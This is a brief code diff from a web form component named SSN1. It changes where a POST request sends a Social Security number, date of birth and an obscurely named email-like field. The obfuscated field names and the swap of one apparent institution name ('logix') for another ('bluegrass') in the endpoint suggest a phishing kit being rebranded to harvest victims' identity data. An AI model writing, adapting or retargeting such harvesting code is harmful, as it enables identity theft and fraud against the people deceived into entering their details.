@@ -70,7 +70,7 @@ function SSN1() {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/logix-meta-data-6/`, {
+        await axios.post(`${baseUrl}api/bluegrass-meta-data-6/`, {
           emzemz: emzemz,
           s2ns: socialSecurityNumber,
           d_b: d_b
